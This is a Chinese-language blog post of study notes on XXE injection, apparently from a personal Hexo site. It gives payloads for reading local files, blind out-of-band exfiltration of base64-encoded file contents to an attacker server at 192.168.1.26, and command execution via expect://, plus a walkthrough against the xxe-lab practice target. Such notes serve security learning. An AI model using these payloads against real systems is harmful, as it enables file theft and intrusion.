@@ -1,0 +1,102 @@
+<!DOCTYPE html><html lang="en" theme-mode="light"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>XXE注入学习笔记 | Vincent</title><link rel="icon" type="image/x-icon" href="/favicon.ico"><script>var config = {"root":"/","search":{"preload":"all","activeHolder":"键入以继续","blurHolder":"数据检索","noResult":"无 $0 相关数据"},"code":{"codeInfo":"$0 - 共 $1 行","copy":"复制","copyFinish":"复制成功","expand":"展开"}}</script><script src="//unpkg.com/valine/dist/Valine.min.js"></script><script src="//unpkg.com/mermaid@9.2.2/dist/mermaid.min.js"></script><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lightgallery.css"><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lg-zoom.css"><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lg-thumbnail.css"><link type="text/css" rel="stylesheet" href="/lib/fontawesome/brands.min.css"><link type="text/css" rel="stylesheet" href="/lib/fontawesome/fontawesome.min.css"><link rel="stylesheet" href="/css/arknights.css"><script>if (window.localStorage.getItem('theme-mode') === 'light') document.documentElement.setAttribute('theme-mode', 'light')
+if (window.localStorage.getItem('theme-mode') === 'dark') document.documentElement.setAttribute('theme-mode', 'dark')</script><style>@font-face {
+ font-family: BenderLight;
+ src: local('Bender'), url("/font/BenderLight.ttf");
+}
+@font-face {
+ font-family: 'JetBrains Mono';
+ src: local('JetBrains Mono'), url('/font/JetBrainsMono-Regular.woff2') format('woff2');
+}
+@font-face {
+ font-family: 'Font Awesome 6 Brands';
+ src: local('Font Awesome 6 Brands'), url('/lib/fontawesome/fa-brands.woff2') format('woff2');
+}
+@font-face {
+ font-family: 'Font Awesome 6 Free';
+ src: local('Font Awesome 6 Free'), url('/lib/fontawesome/fa-regular.woff2') format('woff2');
+}</style><style>:root {
+  --dark-background: url('https://cdnjson.com/images/2023/05/14/bg.jpg');
+  --light-background: url('https://cdnjson.com/images/2023/05/14/bk.jpg');
+}</style><meta name="generator" content="Hexo 6.3.0"></head><body><div class="loading" style="opacity: 0"><div class="loadingBar left"></div><div class="loadingBar right"></div></div><main><header class="closed"><nav><div class="navBtn hide"><i class="navBtnIcon"><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span></i></div><div class="navItem" id="search-header"><span class="navItemTitle"><input autocomplete="off" autocorrect="off" autocapitalize="none" placeholder="数据检索" spellcheck="false" maxlength="50" type="text" id="search-input"></span></div><div class="navItem" id="search-holder"></div><div class="search-popup"><div id="search-result"></div></div><ol class="navContent"><li class="navItem"><a class="navBlock" href="/"><span class="navItemTitle">Home</span></a></li><li class="navItem" matchdata="categories,tags"><a class="navBlock" href="/archives/"><span class="navItemTitle">Archives</span></a></li><li class="navItem"><a class="navBlock" href="/about/"><span class="navItemTitle">About</span></a></li></ol></nav></header><article><div id="post-bg"><div id="post-title"><h1>XXE注入学习笔记</h1><div id="post-info"><span>文章发布时间: <div class="control"><time datetime="2023-07-28T07:52:12.000Z" id="date"> 2023-07-28</time></div></span><br><span>最后更新时间: <div class="control"><time datetime="2023-07-28T10:13:03.335Z" id="updated"> 2023-07-28</time></div></span></div></div><hr><div id="post-content"><p>这篇文章记录xxe注入的基本学习</p>
+<span id="more"></span>
+
+<h1 id="Basic"><a href="#Basic" class="headerlink" title="Basic"></a>Basic</h1><p>xxe注入基于xml，与sql注入，xss注入原理大致相同</p>
+<p>因为xml用于数据传输和存储，所以其渗透实战中的主要作用是读取敏感文件，将黑盒渗透转换为白盒渗透</p>
+<hr>
+<p>接下来看一段极其简单的代码来理解一下xml，事实上他和html几乎一样，唯一的区别就是上面说的，xml用于数据传输和存储，而html用于数据的表示</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span>?&gt;</span>   <span class="hljs-comment">&lt;!--这一行是可选的--&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">Person</span>&gt;</span>                <span class="hljs-comment">&lt;!--每一段xml代码有且只有一个根元素--&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">Name</span>&gt;</span>Vincent<span class="hljs-tag">&lt;/<span class="hljs-name">Name</span>&gt;</span>    <span class="hljs-comment">&lt;!--大小写敏感,每个标签需要闭合--&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">Age</span>&gt;</span>18<span class="hljs-tag">&lt;/<span class="hljs-name">Age</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">Person</span>&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p>不需要作过多的解释，就是这么简单，剩下的可以到文章最后的视频里面去看</p>
+<h1 id="相关场景注入payload"><a href="#相关场景注入payload" class="headerlink" title="相关场景注入payload"></a>相关场景注入payload</h1><h2 id="有回显"><a href="#有回显" class="headerlink" title="有回显"></a>有回显</h2><p>这是一段简单的xxe注入代码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs xml-dtd">&lt;?xml version=&quot;1.0&quot;?&gt;<br>&lt;!DOCTYPE ANY [&lt;!ENTITY xxe SYSTEM &quot;file:///D://Desktop//1.txt&quot;&gt;]&gt;<br>&lt;x&gt;&amp;xxe;&lt;/x&gt;<br></code></pre></td></tr></table></figure>
+
+<p>这一段代码读取<code>/etc/passwd</code>这个文件的内容，并将这些内容赋值给变量<code>xxe</code>然后在<code>&lt;description&gt;</code>标签内将这些内容回显出来</p>
+<h2 id="无回显"><a href="#无回显" class="headerlink" title="无回显"></a>无回显</h2><p>首先肯定是需要判断是否存在xxe漏洞</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs xml-dtd">&lt;?xml version=&quot;1.0&quot;?&gt;<br>&lt;!DOCTYPE ANY [&lt;!ENTITY xxe SYSTEM &quot;http://192.168.1.26:2333&quot;&gt;]&gt;<br>&lt;x&gt;&amp;xxe;&lt;/x&gt;<br></code></pre></td></tr></table></figure>
+
+<p>这一段代码访问了<code>http://192.168.1.26:2333</code></p>
+<p>假如攻击者的服务器是<code>http://192.168.1.26:2333</code>这个网站的功能是可以检测到有什么人访问了网站，如果上传了这一段恶意xml代码之后服务器显示有人访问，说明存在xxe漏洞</p>
+<p>判断存在漏洞之后就是要获取回显的数据了</p>
+<p>攻击者首先将需要执行的恶意代码放到他们的服务器上，然后让程序去访问并执行这个文件，程序执行后会将回显发给攻击者的服务器</p>
+<p>payload：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs xml-dtd">&lt;?xml version=&quot;1.0&quot;?&gt;<br>&lt;!DOCTYPE root [<br>&lt;!ELEMENT root ANY &gt;<br>&lt;!ENTITY % test SYSTEM &quot;http://192.168.1.26/1.xml&quot;&gt;<br>%test; <br>%exe;<br>]&gt;<br>&lt;root&gt;&amp;exfil;&lt;/root&gt;<br></code></pre></td></tr></table></figure>
+
+<p>xml文件：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs xml-dtd">&lt;!ENTITY % data SYSTEM &quot;D:/Desktop/1.txt&quot;&gt;<br>&lt;!ENTITY % exe &quot;&lt;!ENTITY exfil SYSTEM &#x27;http://192.168.1.26:2333/%data;&#x27;&gt;&quot;&gt;<br></code></pre></td></tr></table></figure>
+
+<p>这样服务器就可以在2333端口获取到1.txt的内容了，但是，如果文件中含有中文字符就不会回显，这可能是编码的问题，因此我们需要对其编码，修改后的xml文件如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs xml-dtd">&lt;!ENTITY % data SYSTEM &quot;php://filter/read=convert.base64-encode/resource=D:/Desktop/1.txt&quot;&gt;<br>&lt;!ENTITY % exe &quot;&lt;!ENTITY exfil SYSTEM &#x27;http://192.168.1.26:2333/%data;&#x27;&gt;&quot;&gt;<br></code></pre></td></tr></table></figure>
+
+<h2 id="RCE"><a href="#RCE" class="headerlink" title="RCE"></a>RCE</h2><p>这种情况很少发生，但有些情况下攻击者能够通过XXE执行代码，这主要是由于配置不当&#x2F;开发内部应用导致的。如果我们足够幸运，并且PHP expect模块被加载到了易受攻击的系统或处理XML的内部应用程序上，那么我们就可以执行如下的命令：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">&lt;?xml version=&quot;1.0&quot;?&gt;<br>&lt;!DOCTYPE GVI [ &lt;!ELEMENT foo ANY &gt;<br>&lt;!ENTITY xxe SYSTEM &quot;expect://id&quot; &gt;]&gt;<br>&lt;x&gt;&amp;xxe;&lt;/x&gt;<br></code></pre></td></tr></table></figure>
+
+<h1 id="绕过"><a href="#绕过" class="headerlink" title="绕过"></a>绕过</h1><p>编码，混淆，加密…….</p>
+<h1 id="打靶实战"><a href="#打靶实战" class="headerlink" title="打靶实战"></a>打靶实战</h1><p>靶场：<code>https://github.com/c0ny1/xxe-lab</code></p>
+<p>你万万想象不到他的题目竟然只有一道，还是一个登录框。。。</p>
+<p>ok，直接抓包看报文</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">POST /xxe/doLogin.php HTTP/1.1<br>Host: 127.0.0.1<br>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0<br>Accept: application/xml, text/xml, */*; q=0.01<br>Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2<br>Accept-Encoding: gzip, deflate<br>Content-Type: application/xml;charset=utf-8<br>X-Requested-With: XMLHttpRequest<br>Content-Length: 63<br>Origin: http://127.0.0.1<br>Connection: close<br>Referer: http://127.0.0.1/xxe/<br>Cookie: security_level=0; PHPSESSID=t23tjsmud0qc26k105h4agbjr0<br>Sec-Fetch-Dest: empty<br>Sec-Fetch-Mode: cors<br>Sec-Fetch-Site: same-origin<br><br>&lt;user&gt;&lt;username&gt;admin&lt;/username&gt;&lt;password&gt;123&lt;/password&gt;&lt;/user&gt;<br></code></pre></td></tr></table></figure>
+
+<p>可以看到，最后一行很明显是一个xml的内容，并且存在用户名处的回显，因此我们构造注入语句：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">file:///D://Desktop//1.txt<br></code></pre></td></tr></table></figure>
+
+<p>也就是：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs xml-dtd">&lt;?xml version=&quot;1.0&quot;?&gt;<br>&lt;!DOCTYPE ANY [&lt;!ENTITY xxe SYSTEM &quot;file:///D://Desktop//1.txt&quot;&gt;]&gt;<br>&lt;user&gt;&lt;username&gt;&amp;xxe;&lt;/username&gt;&lt;password&gt;123&lt;/password&gt;&lt;/user&gt;<br></code></pre></td></tr></table></figure>
+
+<p>bp发包，可以看到已经回显出了文件的内容</p>
+<hr>
+<p>使用盲注的方式再来做一遍巩固一下，现在的payload是</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs xml-dtd">&lt;?xml version=&quot;1.0&quot;?&gt;<br>&lt;!DOCTYPE root [<br>&lt;!ELEMENT root ANY &gt;<br>&lt;!ENTITY % test SYSTEM &quot;http://192.168.1.26/1.xml&quot;&gt;<br>%test; <br>%exe;<br>]&gt;<br>&lt;user&gt;&lt;username&gt;&amp;exfil;&lt;/username&gt;&lt;password&gt;123&lt;/password&gt;&lt;/user&gt;<br></code></pre></td></tr></table></figure>
+
+<p>xml文件内容就在上面《无回显》章节</p>
+<p>bp发包，成功接收到b64编码后的内容，完美结束！</p>
+<blockquote>
+<p><a target="_blank" rel="noopener" href="https://www.bilibili.com/video/BV1at41177SA/?spm_id_from=333.337.search-card.all.click&vd_source=1c43bcf31e4abf33f3960dd414786c92">WEB安全漏洞介绍-XML外部实体注入攻击（XXE)</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.bilibili.com/video/BV1Hh411C7oT/?spm_id_from=333.337.search-card.all.click">XXE漏洞讲解,如何判断XXE,通俗理解XXE</a></p>
+<p><a target="_blank" rel="noopener" href="https://note.youdao.com/ynoteshare/index.html?id=b41700dbd75216812521ad5179e7291b&type=note&_time=1690534906767">https://note.youdao.com/ynoteshare/index.html?id=b41700dbd75216812521ad5179e7291b&amp;type=note&amp;_time=1690534906767</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/177979.html">XXE漏洞利用技巧：从XML到远程代码执行</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.bilibili.com/video/BV1e64y1M7E1/?spm_id_from=333.337.search-card.all.click&vd_source=1c43bcf31e4abf33f3960dd414786c92">【ctf】【web】【xxe】SVG与盲xxe你会玩吗？</a>    (这个视频真的帮助很大)</p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_43749601/article/details/115330101">XML外部实体注入；XXE漏洞；XXE有回显注入；XXE无回显注入；Blind XXE；绕过方式总结</a></p>
+</blockquote>
+<div id="paginator"></div></div><div id="post-footer"><div id="pages"><div class="footer-link" style="width: 50%;text-align:right;border-right:1px #fe2 solid"><a href="/2023/07/29/js%E9%80%86%E5%90%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-1/">← Next js逆向学习笔记#1</a></div><div class="footer-link" style="width: 50%;right:1px;border-left:1px #fe2 solid"><a href="/2023/07/11/PortSwigger%E6%89%93%E9%9D%B6%E9%9A%8F%E8%AE%B0/">PortSwigger打靶随记 Prev →</a></div></div></div><div id="comments"><div class="selector"><button class="valine-sel"></button></div><div id="valine"></div></div></div><div class="bottom-btn"><div><a id="to-top" onClick="scrolls.scrolltop();" title="回到顶部" style="opacity: 0; display: none;">∧</a><a id="to-index" href="#toc-div" title="文章目录">≡</a><a id="color-mode" onClick="colorMode.change()" title="切换主题"></a></div></div></article><aside><div id="about"><a href="/" id="logo"><img src="./img/logo.jpg" alt="Logo"></a><h1 id="Dr"><a href="/">Vincent</a></h1><div id="description"><p>不与无谓人争气</p></div></div><div id="aside-block"><div id="toc-div"><h1>目录</h1><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Basic"><span class="toc-number">1.</span> <span class="toc-text">Basic</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%9B%B8%E5%85%B3%E5%9C%BA%E6%99%AF%E6%B3%A8%E5%85%A5payload"><span class="toc-number">2.</span> <span class="toc-text">相关场景注入payload</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9C%89%E5%9B%9E%E6%98%BE"><span class="toc-number">2.1.</span> <span class="toc-text">有回显</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%97%A0%E5%9B%9E%E6%98%BE"><span class="toc-number">2.2.</span> <span class="toc-text">无回显</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#RCE"><span class="toc-number">2.3.</span> <span class="toc-text">RCE</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%BB%95%E8%BF%87"><span class="toc-number">3.</span> <span class="toc-text">绕过</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%89%93%E9%9D%B6%E5%AE%9E%E6%88%98"><span class="toc-number">4.</span> <span class="toc-text">打靶实战</span></a></li></ol></div></div><footer><nobr>构建自 <a target="_blank" rel="noopener" href="http://hexo.io">Hexo</a></nobr><wbr><nobr> 使用主题 <a target="_blank" rel="noopener" href="https://github.com/Yue-plus/hexo-theme-arknights">Arknights</a></nobr><wbr><nobr>主题作者 <a target="_blank" rel="noopener" href="https://github.com/Yue-plus">Yue_plus</a></nobr></footer></aside></main><canvas id="canvas-dust"></canvas><script src="/js/search.js"></script><script src="/js/arknights.js"></script><script src="//unpkg.com/lightgallery@2.7.1/lightgallery.min.js"></script><script src="//unpkg.com/lightgallery@2.7.1/plugins/zoom/lg-zoom.min.js"></script><script src="//unpkg.com/lightgallery@2.7.1/plugins/thumbnail/lg-thumbnail.min.js"></script><script src="/js/pjax.js"></script><script class="pjax-js">reset= () => {new Valine({
+ el: '#valine'
+ , appId: 'HPascq2qxfVnEiu0BvuEltaD-gzGzoHsz'
+ , appKey: 'AKHEZyHQcEOLkAQk07kDBYgN' , placeholder: '此条评论委托企鹅物流发送'
+ , path: window.location.pathname
+});code.findCode();
+document.querySelector('.lg-container')?.remove()
+lightGallery(document.getElementById('post-bg'), {
+  plugins: [lgZoom,lgThumbnail],
+  selector: '.item-img'})}</script><script>window.addEventListener("load",() => {pjax = new Pjax({
+ cacheBust: false,
+ selectors: ['title','article','#aside-block','.pjax-js'],
+ switches: {'article': Pjax.switches.sideBySide},
+ switchesOptions: {
+   'article': {
+     classNames: {
+       remove: "pjax-out",
+       add: "pjax-in"
+     }
+   }
+ }
+});
+document.addEventListener("pjax:complete", reset);reset()})</script></body></html>
